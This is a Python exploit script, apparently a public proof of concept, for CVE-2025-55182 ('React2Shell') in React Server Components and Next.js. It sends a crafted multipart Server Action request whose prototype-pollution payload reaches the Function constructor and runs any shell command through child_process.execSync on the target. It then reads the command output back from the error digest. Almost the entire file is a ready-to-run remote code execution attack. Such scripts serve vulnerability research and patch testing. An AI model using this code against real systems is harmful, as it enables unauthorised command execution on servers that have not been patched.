# Exploit Title: React2Shell â€“ Remote Code Execution (RCE)
# Exploit Author: Yesith Alvarez
# Vendor Homepage: https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
# Version: next 16.0.6 - react 19.2.0 - react-dom 19.2.0
# CVE: CVE-2025-55182
# Research Link: https://github.com/yealvarez/CVE/

import requests
import sys
import json


def title():
    print(r'''
    
   _______      ________    ___   ___ ___  _____       _____ _____ __  ___ ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|     | ____| ____/_ |/ _ \__ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) | |__ ______| |__ | |__  | | (_) | ) |
 | |      \ \/ / |  __|______/ /| | | |/ /|___ \______|___ \|___ \ | |> _ < / / 
 | |____   \  /  | |____    / /_| |_| / /_ ___) |      ___) |___) || | (_) / /_ 
  \_____|   \/   |______|  |____|\___/____|____/      |____/|____/ |_|\___/____|
  
[+] Remote Code Execution (react2shell)                                                                                                       
Author: Yesith Alvarez
Github: https://github.com/yealvarez
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
    ''')


def exploit(target_url, cmd):
    payload = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0777"}',
        "_response": {
            "_prefix": "var res = process.mainModule.require('child_process').execSync('" + cmd + "',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    files = {"0": (None, json.dumps(payload)),"1": (None, '"$@0"')}

    headers = {"Next-Action": "x"}

    try:
        r = requests.post(target_url, files=files, headers=headers, timeout=10)
        
        lines = r.text.splitlines()
        for line in lines:
          if "digest" in line:
               start = line.find("{")
               json_part = line[start:]               
               data = json.loads(json_part)
               result = data["digest"]
        print("$ "+cmd)  
        print(result)

    except Exception as e:
        print("\n[-] Error:", e)


def main():
    title()

    if len(sys.argv) < 3:
        print("[+] USAGE: python3 " + sys.argv[0] + " http://target:port 'command'")
        print("[+] EXAMPLE: python3 " + sys.argv[0] + " http://10.10.10.10:3000 'ls -la'")
        return

    url = sys.argv[1]
    command = sys.argv[2]

    exploit(url, command)


if __name__ == "__main__":
    main()
